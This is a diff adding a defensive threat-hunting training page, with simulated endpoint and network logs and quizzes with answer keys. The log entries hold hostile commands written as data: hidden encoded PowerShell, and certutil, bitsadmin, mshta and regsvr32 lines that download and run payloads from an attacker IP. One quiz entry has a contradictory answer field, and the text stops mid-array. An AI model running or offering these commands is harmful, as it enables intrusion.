@@ -1,0 +1,1560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../components/AchievementManager.js"></script>
+    <script src="../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threat Hunting Lab - Eye House - Hexworth Prime</title>
+    <style>
+        /* ============================================================
+           ROOT & RESET
+        ============================================================ */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --accent:      #00ff41;
+            --accent-dim:  #00c832;
+            --accent-glow: rgba(0,255,65,0.18);
+            --bg-deep:     #0a0a0a;
+            --bg-panel:    #0f1419;
+            --bg-card:     #141c23;
+            --bg-hover:    #1a2530;
+            --border:      rgba(0,255,65,0.22);
+            --border-hi:   rgba(0,255,65,0.55);
+            --text:        #c8d6e0;
+            --text-dim:    #556b7a;
+            --text-label:  #8aa0b0;
+            --red:         #ff4444;
+            --red-dim:     rgba(255,68,68,0.18);
+            --orange:      #ff9f00;
+            --yellow:      #ffd700;
+            --cyan:        #00d4e8;
+            --purple:      #bd93f9;
+        }
+
+        body {
+            background: var(--bg-deep);
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ============================================================
+           BACK LINK
+        ============================================================ */
+        .back-link {
+            position: fixed;
+            top: 14px; left: 18px;
+            color: var(--accent-dim);
+            font-size: 13px;
+            cursor: pointer;
+            z-index: 200;
+            text-decoration: none;
+            letter-spacing: 1px;
+            transition: color 0.2s;
+        }
+        .back-link:hover { color: var(--accent); }
+
+        /* ============================================================
+           HEADER
+        ============================================================ */
+        .app-header {
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 24px 14px 80px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+        }
+        .app-header h1 {
+            font-size: 15px;
+            color: var(--accent);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        .app-header .meta {
+            font-size: 12px;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+
+        /* ============================================================
+           HUNT PROGRESS BAR
+        ============================================================ */
+        .hunt-progress {
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 24px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .hunt-steps {
+            display: flex;
+            gap: 6px;
+            flex: 1;
+        }
+        .hunt-step {
+            flex: 1;
+            height: 6px;
+            background: var(--bg-card);
+            border-radius: 3px;
+            border: 1px solid var(--border);
+            transition: background 0.4s;
+        }
+        .hunt-step.complete { background: var(--accent); }
+        .hunt-step.active   { background: var(--accent-dim); animation: pulse-bar 1.2s infinite; }
+        @keyframes pulse-bar { 0%,100%{opacity:1} 50%{opacity:0.5} }
+
+        .score-display {
+            font-size: 13px;
+            color: var(--accent);
+            white-space: nowrap;
+            letter-spacing: 1px;
+        }
+        .hunt-label {
+            font-size: 11px;
+            color: var(--text-dim);
+            white-space: nowrap;
+            letter-spacing: 1px;
+        }
+
+        /* ============================================================
+           MAIN LAYOUT
+        ============================================================ */
+        .app-body {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 340px 1fr;
+            grid-template-rows: 1fr;
+            gap: 0;
+            overflow: hidden;
+            height: calc(100vh - 97px);
+        }
+
+        /* ============================================================
+           LEFT PANEL (Intel + Hypothesis)
+        ============================================================ */
+        .left-panel {
+            border-right: 1px solid var(--border);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .panel-section {
+            border-bottom: 1px solid var(--border);
+            padding: 16px;
+        }
+        .panel-section:last-child { border-bottom: none; }
+
+        .section-label {
+            font-size: 10px;
+            color: var(--accent-dim);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+
+        /* Intel brief — classified document style */
+        .intel-brief {
+            background: #0d1a0d;
+            border: 1px solid rgba(0,255,65,0.3);
+            border-radius: 4px;
+            padding: 12px;
+            position: relative;
+        }
+        .intel-brief::before {
+            content: 'CLASSIFIED // TLP:RED';
+            display: block;
+            font-size: 9px;
+            color: var(--red);
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            border-bottom: 1px solid rgba(255,68,68,0.3);
+            padding-bottom: 6px;
+        }
+        .intel-title {
+            font-size: 12px;
+            color: var(--accent);
+            margin-bottom: 6px;
+            letter-spacing: 1px;
+        }
+        .intel-body {
+            font-size: 12px;
+            color: var(--text);
+            line-height: 1.7;
+        }
+        .intel-tag {
+            display: inline-block;
+            margin-top: 8px;
+            font-size: 10px;
+            background: var(--red-dim);
+            color: var(--red);
+            border: 1px solid rgba(255,68,68,0.3);
+            border-radius: 3px;
+            padding: 2px 6px;
+            letter-spacing: 1px;
+            margin-right: 4px;
+        }
+
+        /* Hypothesis cards */
+        .hypothesis-list { display: flex; flex-direction: column; gap: 8px; }
+        .hypothesis-card {
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+            line-height: 1.5;
+        }
+        .hypothesis-card:hover { border-color: var(--accent-dim); background: var(--bg-hover); }
+        .hypothesis-card.selected {
+            border-color: var(--accent);
+            background: var(--accent-glow);
+            color: var(--accent);
+        }
+        .hypothesis-card.locked { pointer-events: none; opacity: 0.7; }
+        .hypothesis-card.correct-reveal { border-color: var(--accent); background: var(--accent-glow); }
+        .hypothesis-card.wrong-reveal   { border-color: var(--red); background: var(--red-dim); color: var(--red); }
+
+        /* Analysis questions */
+        .question-block {
+            margin-bottom: 14px;
+            padding: 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+        }
+        .question-text { font-size: 12px; color: var(--text); margin-bottom: 8px; line-height: 1.5; }
+        .answer-option {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 8px;
+            margin: 3px 0;
+            border: 1px solid transparent;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.15s;
+        }
+        .answer-option:hover:not(.locked) { border-color: var(--border-hi); background: var(--bg-hover); }
+        .answer-option input[type="radio"] { accent-color: var(--accent); }
+        .answer-option.correct-reveal { border-color: var(--accent); background: var(--accent-glow); color: var(--accent); }
+        .answer-option.wrong-reveal   { border-color: var(--red); background: var(--red-dim); color: var(--red); }
+        .answer-option.locked { pointer-events: none; }
+
+        .feedback-msg {
+            font-size: 11px;
+            margin-top: 6px;
+            padding: 4px 8px;
+            border-radius: 3px;
+            display: none;
+        }
+        .feedback-msg.show { display: block; }
+        .feedback-msg.ok  { color: var(--accent); background: var(--accent-glow); }
+        .feedback-msg.bad { color: var(--red); background: var(--red-dim); }
+
+        /* ============================================================
+           RIGHT PANEL (Data + Questions)
+        ============================================================ */
+        .right-panel {
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .right-top {
+            flex: 1;
+            overflow-y: auto;
+            border-bottom: 1px solid var(--border);
+            padding: 16px;
+        }
+
+        .right-bottom {
+            flex-shrink: 0;
+            overflow-y: auto;
+            max-height: 45%;
+            padding: 16px;
+        }
+
+        /* Hunt title */
+        .hunt-title-bar {
+            display: flex;
+            align-items: baseline;
+            gap: 12px;
+            margin-bottom: 14px;
+        }
+        .hunt-number {
+            font-size: 10px;
+            color: var(--accent-dim);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        .hunt-title {
+            font-size: 16px;
+            color: var(--accent);
+            letter-spacing: 1px;
+        }
+        .difficulty-badge {
+            font-size: 10px;
+            letter-spacing: 1px;
+            padding: 2px 8px;
+            border-radius: 3px;
+            margin-left: auto;
+        }
+        .diff-easy   { background: rgba(0,255,65,0.15); color: var(--accent); border: 1px solid rgba(0,255,65,0.3); }
+        .diff-medium { background: rgba(255,159,0,0.15); color: var(--orange); border: 1px solid rgba(255,159,0,0.3); }
+        .diff-hard   { background: rgba(255,68,68,0.15); color: var(--red); border: 1px solid rgba(255,68,68,0.3); }
+
+        /* Log viewer */
+        .log-viewer {
+            background: #050d05;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 11px;
+            line-height: 1.8;
+        }
+        .log-entry {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            padding: 3px 6px;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background 0.15s;
+            border: 1px solid transparent;
+            margin-bottom: 2px;
+        }
+        .log-entry:hover:not(.no-flag) { background: var(--bg-hover); border-color: var(--border); }
+        .log-entry.flagged   { border-color: var(--red); background: var(--red-dim); }
+        .log-entry.correct-flag { border-color: var(--accent); background: var(--accent-glow); }
+        .log-entry.wrong-flag   { border-color: var(--orange); background: rgba(255,159,0,0.1); }
+        .log-entry.no-flag { cursor: default; }
+
+        .flag-btn {
+            flex-shrink: 0;
+            width: 16px;
+            height: 16px;
+            border: 1px solid var(--text-dim);
+            border-radius: 2px;
+            background: transparent;
+            cursor: pointer;
+            font-size: 9px;
+            color: var(--text-dim);
+            transition: all 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2px;
+        }
+        .log-entry.flagged .flag-btn   { background: var(--red); border-color: var(--red); color: #fff; }
+        .log-entry.correct-flag .flag-btn { background: var(--accent); border-color: var(--accent); color: #000; }
+
+        .log-text { flex: 1; word-break: break-all; }
+        .log-ts   { color: var(--text-dim); flex-shrink: 0; }
+        .log-host { color: var(--cyan); }
+        .log-proc { color: var(--yellow); }
+        .log-cmd  { color: var(--orange); }
+        .log-ip   { color: var(--purple); }
+        .log-alert{ color: var(--red); font-weight: bold; }
+
+        /* MITRE tactic dropdown (Hunt 5) */
+        .mitre-select {
+            margin-left: 6px;
+            font-size: 10px;
+            background: var(--bg-card);
+            color: var(--text);
+            border: 1px solid var(--border);
+            border-radius: 3px;
+            padding: 2px 4px;
+            font-family: 'Courier New', monospace;
+            cursor: pointer;
+        }
+        .mitre-select.correct-tactic { border-color: var(--accent); color: var(--accent); }
+        .mitre-select.wrong-tactic   { border-color: var(--red); color: var(--red); }
+
+        /* Timeline (Hunt 2) */
+        .timeline-wrap {
+            background: #050d05;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-bottom: 12px;
+            overflow-x: auto;
+        }
+        .timeline-label {
+            font-size: 10px;
+            color: var(--accent-dim);
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+        .timeline-ascii {
+            font-size: 11px;
+            white-space: pre;
+            color: var(--text-dim);
+            line-height: 1.6;
+        }
+        .timeline-ascii .hl { color: var(--red); }
+
+        /* Buttons */
+        .btn {
+            padding: 8px 18px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            letter-spacing: 1px;
+            border-radius: 4px;
+            border: 1px solid var(--accent);
+            background: transparent;
+            color: var(--accent);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn:hover { background: var(--accent-glow); }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        .btn-primary { background: var(--accent); color: #000; font-weight: bold; }
+        .btn-primary:hover { background: var(--accent-dim); }
+        .btn-primary:disabled { background: transparent; color: var(--accent); }
+
+        .action-bar {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border);
+        }
+        .action-hint { font-size: 11px; color: var(--text-dim); flex: 1; }
+
+        /* Flags counter */
+        .flags-counter {
+            font-size: 11px;
+            color: var(--text-label);
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+        .flags-counter span { color: var(--red); }
+
+        /* ============================================================
+           COMPLETION SCREEN
+        ============================================================ */
+        #completion-screen {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            z-index: 500;
+            align-items: center;
+            justify-content: center;
+        }
+        #completion-screen.show { display: flex; }
+
+        .completion-card {
+            background: var(--bg-panel);
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 36px 44px;
+            max-width: 520px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(0,255,65,0.2);
+        }
+        .completion-card h2 {
+            font-size: 22px;
+            color: var(--accent);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        .rank-title {
+            font-size: 14px;
+            color: var(--yellow);
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        .score-bar-wrap {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            height: 12px;
+            margin: 10px 0 20px;
+            overflow: hidden;
+        }
+        .score-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-dim), var(--accent));
+            border-radius: 4px;
+            transition: width 1s ease;
+        }
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            padding: 5px 0;
+            border-bottom: 1px solid var(--border);
+            color: var(--text-label);
+        }
+        .stat-row span:last-child { color: var(--text); }
+        .stat-row:last-of-type { border-bottom: none; }
+        .completion-xp {
+            margin-top: 18px;
+            font-size: 13px;
+            color: var(--accent);
+            letter-spacing: 1px;
+        }
+
+        /* ============================================================
+           SCROLLBARS
+        ============================================================ */
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: var(--bg-deep); }
+        ::-webkit-scrollbar-thumb { background: var(--border-hi); border-radius: 3px; }
+    </style>
+</head>
+<body>
+
+<a class="back-link" onclick="window.history.back()">← Back</a>
+
+<!-- ================================================================
+     HEADER
+================================================================ -->
+<header class="app-header">
+    <h1>Threat Hunting Lab</h1>
+    <span class="meta">EYE HOUSE // HYPOTHESIS-DRIVEN THREAT HUNTING</span>
+</header>
+
+<!-- ================================================================
+     HUNT PROGRESS
+================================================================ -->
+<div class="hunt-progress">
+    <span class="hunt-label">HUNT</span>
+    <div class="hunt-steps" id="hunt-steps">
+        <div class="hunt-step active"  id="step-0"></div>
+        <div class="hunt-step"         id="step-1"></div>
+        <div class="hunt-step"         id="step-2"></div>
+        <div class="hunt-step"         id="step-3"></div>
+        <div class="hunt-step"         id="step-4"></div>
+    </div>
+    <span class="score-display" id="score-display">SCORE: 0</span>
+</div>
+
+<!-- ================================================================
+     APP BODY
+================================================================ -->
+<div class="app-body">
+    <!-- LEFT PANEL -->
+    <div class="left-panel">
+        <!-- Intel Brief -->
+        <div class="panel-section">
+            <div class="section-label">Threat Intelligence</div>
+            <div class="intel-brief">
+                <div class="intel-title" id="intel-title"></div>
+                <div class="intel-body"  id="intel-body"></div>
+                <div id="intel-tags"></div>
+            </div>
+        </div>
+
+        <!-- Hypothesis Selection -->
+        <div class="panel-section" id="hypothesis-section">
+            <div class="section-label">Select Hypothesis</div>
+            <div class="hypothesis-list" id="hypothesis-list"></div>
+            <div class="action-bar">
+                <span class="action-hint" id="hyp-hint">Select a hypothesis to guide your hunt.</span>
+                <button class="btn btn-primary" id="lock-hyp-btn" onclick="lockHypothesis()" disabled>Lock In</button>
+            </div>
+        </div>
+
+        <!-- Analysis Panel (questions) -->
+        <div class="panel-section" id="analysis-section" style="display:none;">
+            <div class="section-label">Analysis</div>
+            <div id="questions-container"></div>
+            <div class="action-bar" id="submit-bar" style="display:none;">
+                <span class="action-hint" id="submit-hint">Answer all questions to proceed.</span>
+                <button class="btn btn-primary" id="submit-btn" onclick="submitAnalysis()">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- RIGHT PANEL -->
+    <div class="right-panel">
+        <div class="right-top" id="right-top">
+            <!-- Hunt title + data panel injected here -->
+        </div>
+        <div class="right-bottom" id="right-bottom" style="display:none;">
+            <!-- Next hunt button -->
+        </div>
+    </div>
+</div>
+
+<!-- ================================================================
+     COMPLETION SCREEN
+================================================================ -->
+<div id="completion-screen">
+    <div class="completion-card">
+        <h2>Hunt Complete</h2>
+        <div class="rank-title" id="comp-rank"></div>
+        <div class="stat-row"><span>Total Score</span><span id="comp-score"></span></div>
+        <div class="stat-row"><span>Max Score</span><span id="comp-max"></span></div>
+        <div class="score-bar-wrap"><div class="score-bar-fill" id="comp-bar"></div></div>
+        <div class="stat-row"><span>Correct Flags</span><span id="comp-flags"></span></div>
+        <div class="stat-row"><span>Wrong Flags</span><span id="comp-wrong"></span></div>
+        <div class="stat-row"><span>Questions Correct</span><span id="comp-qcorrect"></span></div>
+        <div class="completion-xp" id="comp-xp"></div>
+        <div class="action-bar" style="margin-top:24px;justify-content:center;">
+            <button class="btn btn-primary" onclick="closeCompletion()">Close</button>
+        </div>
+    </div>
+</div>
+
+<!-- ================================================================
+     JAVASCRIPT
+================================================================ -->
+<script>
+/* ============================================================
+   HUNT DATA — 5 escalating hunts with realistic log entries
+============================================================ */
+const HUNTS = [
+    /* ── HUNT 1: Suspicious PowerShell Activity (Easy) ─────── */
+    {
+        id: 1,
+        title: 'Suspicious PowerShell Activity',
+        difficulty: 'EASY',
+        diffClass: 'diff-easy',
+        intel: {
+            title: 'CISA Advisory AA24-187A',
+            body: 'APT41 (BRONZE ATLAS) observed using Base64-encoded PowerShell commands for initial access and payload staging. Encoded commands bypass simple string-matching defenses. Targeting IT sector endpoints via phishing.',
+            tags: ['APT41', 'POWERSHELL', 'INITIAL-ACCESS']
+        },
+        hypotheses: [
+            { text: 'Adversaries are exfiltrating data via PowerShell web requests to external IPs.', correct: false },
+            { text: 'Encoded PowerShell commands are being executed on workstations to stage malicious payloads.', correct: true },
+            { text: 'PowerShell remoting (WinRM) is being abused for lateral movement between servers.', correct: false }
+        ],
+        showTimeline: false,
+        showMitre: false,
+        flagInstructions: 'Flag entries showing encoded or suspicious PowerShell execution.',
+        logEntries: [
+            { id:'l1', ts:'08:12:34', host:'WS-MKTG-04', proc:'powershell.exe', cmd:'-ExecutionPolicy Bypass -NoProfile -W Hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==', malicious:true },
+            { id:'l2', ts:'08:15:01', host:'SRV-DC-01',  proc:'svchost.exe',   cmd:'C:\\Windows\\System32\\svchost.exe -k netsvcs', malicious:false },
+            { id:'l3', ts:'08:22:11', host:'WS-SALES-09',proc:'powershell.exe',cmd:'-enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA', malicious:true },
+            { id:'l4', ts:'08:30:44', host:'WS-HR-02',   proc:'explorer.exe',  cmd:'C:\\Windows\\Explorer.EXE', malicious:false },
+            { id:'l5', ts:'08:31:22', host:'WS-HR-02',   proc:'powershell.exe',cmd:'-NonInteractive Get-EventLog -LogName System -Newest 10', malicious:false },
+            { id:'l6', ts:'08:45:08', host:'WS-IT-11',   proc:'powershell.exe',cmd:'-ExecutionPolicy Bypass -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=', malicious:true },
+            { id:'l7', ts:'09:01:55', host:'SRV-FILE-02',proc:'msiexec.exe',   cmd:'/quiet /i software_update.msi', malicious:false },
+            { id:'l8', ts:'09:10:31', host:'WS-MKTG-04', proc:'powershell.exe',cmd:'-enc JAByAGUAcwBwAG8AbgBzAGUAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==', malicious:true },
+            { id:'l9', ts:'09:14:00', host:'WS-DEV-07',  proc:'powershell.exe',cmd:'Import-Module ActiveDirectory; Get-ADUser -Filter *', malicious:false },
+            { id:'l10',ts:'09:22:19', host:'WS-SALES-09',proc:'cmd.exe',       cmd:'whoami /all', malicious:false },
+            { id:'l11',ts:'09:30:07', host:'WS-ACCT-03', proc:'powershell.exe',cmd:'-enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAB0AGgAIABDADoAXA==', malicious:true },
+            { id:'l12',ts:'09:45:52', host:'SRV-DC-01',  proc:'services.exe',  cmd:'C:\\Windows\\System32\\services.exe', malicious:false }
+        ],
+        questions: [
+            {
+                q: 'How many workstations show evidence of encoded PowerShell execution?',
+                options: ['2', '3', '4', '5'],
+                correct: 1,  // "3" — WS-MKTG-04, WS-SALES-09, WS-IT-11, WS-ACCT-03 = 4, answer index 2
+                // Corrected: WS-MKTG-04 (l1,l8), WS-SALES-09 (l3), WS-IT-11 (l6), WS-ACCT-03 (l11) = 4 hosts
+                correctIdx: 2,
+                explanation: 'Four hosts executed encoded PowerShell: WS-MKTG-04, WS-SALES-09, WS-IT-11, WS-ACCT-03.'
+            },
+            {
+                q: 'Which host shows the EARLIEST encoded PowerShell execution?',
+                options: ['WS-SALES-09', 'WS-MKTG-04', 'WS-IT-11', 'WS-ACCT-03'],
+                correctIdx: 1,
+                explanation: 'WS-MKTG-04 executed encoded PowerShell at 08:12:34, the earliest timestamp in the dataset.'
+            },
+            {
+                q: 'What PowerShell flag is consistently used to hide the console window from the user?',
+                options: ['-NonInteractive', '-NoProfile', '-W Hidden', '-ExecutionPolicy Bypass'],
+                correctIdx: 2,
+                explanation: '-W Hidden (WindowStyle Hidden) suppresses the PowerShell window, a classic evasion technique.'
+            }
+        ]
+    },
+
+    /* ── HUNT 2: Beaconing Detection (Easy-Medium) ──────────── */
+    {
+        id: 2,
+        title: 'Beaconing Detection',
+        difficulty: 'EASY-MED',
+        diffClass: 'diff-easy',
+        intel: {
+            title: 'Threat Intel Report TIR-2024-0892',
+            body: 'Qakbot variant "QakV5" beacons to C2 infrastructure every 60 (+/- 5) seconds over HTTPS/443. C2 IPs rotate weekly; current campaign uses AS49981 (WorldStream BV). Expect consistent interval connections from a single infected host.',
+            tags: ['QAKBOT', 'C2-BEACONING', 'HTTPS', 'PERSISTENCE']
+        },
+        hypotheses: [
+            { text: 'An infected host is performing DNS tunneling to exfiltrate data through authoritative DNS servers.', correct: false },
+            { text: 'A compromised workstation is beaconing to a C2 server at regular intervals over HTTPS.', correct: true },
+            { text: 'Multiple hosts are participating in a DDoS amplification attack via UDP/443.', correct: false }
+        ],
+        showTimeline: true,
+        showMitre: false,
+        flagInstructions: 'Flag the network connections that form the regular beaconing pattern.',
+        logEntries: [
+            { id:'n1',  ts:'10:00:12', host:'WS-ACCT-03', proc:'chrome.exe',     cmd:'203.0.113.44:443 HTTPS 1.2KB', malicious:false },
+            { id:'n2',  ts:'10:01:08', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n3',  ts:'10:02:14', host:'WS-ACCT-03', proc:'msedge.exe',     cmd:'142.250.80.46:443 HTTPS 220KB', malicious:false },
+            { id:'n4',  ts:'10:02:10', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n5',  ts:'10:04:11', host:'WS-HR-02',   proc:'chrome.exe',     cmd:'13.107.42.14:443 HTTPS 88KB',  malicious:false },
+            { id:'n6',  ts:'10:03:14', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n7',  ts:'10:06:00', host:'WS-ACCT-03', proc:'chrome.exe',     cmd:'52.88.249.11:443 HTTPS 14KB',  malicious:false },
+            { id:'n8',  ts:'10:04:17', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n9',  ts:'10:08:30', host:'SRV-DC-01',  proc:'lsass.exe',      cmd:'10.0.0.1:389 LDAP 2KB',        malicious:false },
+            { id:'n10', ts:'10:05:19', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n11', ts:'10:10:15', host:'WS-MKTG-04', proc:'teams.exe',      cmd:'52.113.194.132:443 HTTPS 4KB', malicious:false },
+            { id:'n12', ts:'10:06:21', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n13', ts:'10:12:44', host:'WS-HR-02',   proc:'chrome.exe',     cmd:'172.217.16.46:443 HTTPS 56KB', malicious:false },
+            { id:'n14', ts:'10:07:23', host:'WS-SALES-09',proc:'svchost.exe',    cmd:'185.220.101.7:443 HTTPS 0.4KB', malicious:true },
+            { id:'n15', ts:'10:15:00', host:'WS-ACCT-03', proc:'outlook.exe',    cmd:'40.101.4.141:443 HTTPS 8KB',   malicious:false }
+        ],
+        timelineData: [
+            '  HOST: WS-SALES-09  DEST: 185.220.101.7:443  PROCESS: svchost.exe',
+            '  ',
+            '  10:01:08  |-----> [conn]                   interval: --',
+            '  10:02:10  |-----> [conn]                   interval: ~62s',
+            '  10:03:14  |-----> [conn]                   interval: ~64s',
+            '  10:04:17  |-----> [conn]                   interval: ~63s',
+            '  10:05:19  |-----> [conn]                   interval: ~62s',
+            '  10:06:21  |-----> [conn]                   interval: ~62s',
+            '  10:07:23  |-----> [conn]                   interval: ~62s  <-- PATTERN',
+        ],
+        questions: [
+            {
+                q: 'Which host is beaconing to the C2 server?',
+                options: ['WS-ACCT-03', 'WS-HR-02', 'WS-SALES-09', 'WS-MKTG-04'],
+                correctIdx: 2,
+                explanation: 'WS-SALES-09 is the beaconing host — it makes 7 connections to 185.220.101.7 at consistent ~62-second intervals.'
+            },
+            {
+                q: 'What is the approximate beacon interval observed in the log data?',
+                options: ['30 seconds', '45 seconds', '62 seconds', '90 seconds'],
+                correctIdx: 2,
+                explanation: 'Intervals between connections are consistently ~62 seconds, fitting the QakV5 60±5s beacon profile.'
+            },
+            {
+                q: 'Which process is responsible for the beaconing connections?',
+                options: ['chrome.exe', 'svchost.exe', 'msedge.exe', 'lsass.exe'],
+                correctIdx: 1,
+                explanation: 'svchost.exe is making C2 connections — malware injecting into this legitimate Windows process is a common LOLBin technique.'
+            },
+            {
+                q: 'What makes the beacon traffic difficult to detect via payload inspection?',
+                options: ['It uses UDP port 53', 'It uses HTTPS (encrypted) on port 443', 'It mimics LDAP traffic', 'Packets are under 1 byte'],
+                correctIdx: 1,
+                explanation: 'HTTPS encryption prevents payload inspection. Defenders must rely on behavioral analysis (interval regularity, small consistent payload sizes) rather than content.'
+            }
+        ]
+    },
+
+    /* ── HUNT 3: Living Off the Land (Medium) ───────────────── */
+    {
+        id: 3,
+        title: 'Living Off the Land (LOLBins)',
+        difficulty: 'MEDIUM',
+        diffClass: 'diff-medium',
+        intel: {
+            title: 'Internal Threat Report ITR-2024-1103',
+            body: 'Threat actor TEMP.VELES observed abusing Windows built-in utilities (LOLBins) to avoid AV detection. Key tools: certutil.exe (file download), bitsadmin.exe (background transfers), mshta.exe (script execution), rundll32.exe (DLL sideloading). Distinguish malicious LOLBin usage from legitimate administrator activity.',
+            tags: ['LOLBINS', 'DEFENSE-EVASION', 'EXECUTION', 'TEMP.VELES']
+        },
+        hypotheses: [
+            { text: 'The threat actor is using Windows built-in utilities to download and execute malicious payloads while evading AV detection.', correct: true },
+            { text: 'The threat actor has deployed a custom rootkit that patches kernel functions to hide malicious processes.', correct: false },
+            { text: 'The threat actor is exploiting a zero-day in Microsoft Print Spooler for privilege escalation.', correct: false }
+        ],
+        showTimeline: false,
+        showMitre: false,
+        flagInstructions: 'Flag entries showing malicious LOLBin usage. Legitimate admin use should NOT be flagged.',
+        logEntries: [
+            { id:'b1', ts:'14:02:11', host:'WS-IT-11',   proc:'certutil.exe', cmd:'-urlcache -split -f http://185.234.219.47/payload.exe C:\\Users\\Public\\svc.exe', malicious:true },
+            { id:'b2', ts:'14:03:44', host:'SRV-CA-01',  proc:'certutil.exe', cmd:'-verify -urlfetch https://ocsp.digicert.com/MFIwTzBNMEswSTAJBgUrDgMCGgUABBQ', malicious:false },
+            { id:'b3', ts:'14:05:29', host:'WS-IT-11',   proc:'bitsadmin.exe',cmd:'/transfer "WindowsUpdate" http://185.234.219.47/stage2.dll %TEMP%\\wupd.dll', malicious:true },
+            { id:'b4', ts:'14:07:00', host:'SRV-PATCH-01',proc:'bitsadmin.exe',cmd:'/transfer "Patches" https://download.microsoft.com/patch/KB5030219.msu C:\\Temp\\KB5030219.msu', malicious:false },
+            { id:'b5', ts:'14:10:18', host:'WS-HR-02',   proc:'mshta.exe',    cmd:'http://185.234.219.47/dropper.hta', malicious:true },
+            { id:'b6', ts:'14:12:33', host:'WS-DEV-07',  proc:'mshta.exe',    cmd:'C:\\Program Files (x86)\\InstallShield\\setup.hta', malicious:false },
+            { id:'b7', ts:'14:15:07', host:'WS-IT-11',   proc:'rundll32.exe', cmd:'C:\\Users\\Public\\wupd.dll,DllRegisterServer', malicious:true },
+            { id:'b8', ts:'14:17:22', host:'SRV-FILE-02',proc:'rundll32.exe', cmd:'C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9BA05972-F6A8-11CF-A442-00A0C90A8F39}', malicious:false },
+            { id:'b9', ts:'14:19:40', host:'WS-ACCT-03', proc:'certutil.exe', cmd:'-decode C:\\Users\\Public\\encoded.txt C:\\Users\\Public\\svc2.exe', malicious:true },
+            { id:'b10',ts:'14:21:55', host:'WS-DEV-07',  proc:'certutil.exe', cmd:'-hashfile C:\\Windows\\System32\\ntdll.dll SHA256', malicious:false },
+            { id:'b11',ts:'14:23:10', host:'WS-MKTG-04', proc:'regsvr32.exe', cmd:'/s /n /u /i:http://185.234.219.47/com.sct scrobj.dll', malicious:true },
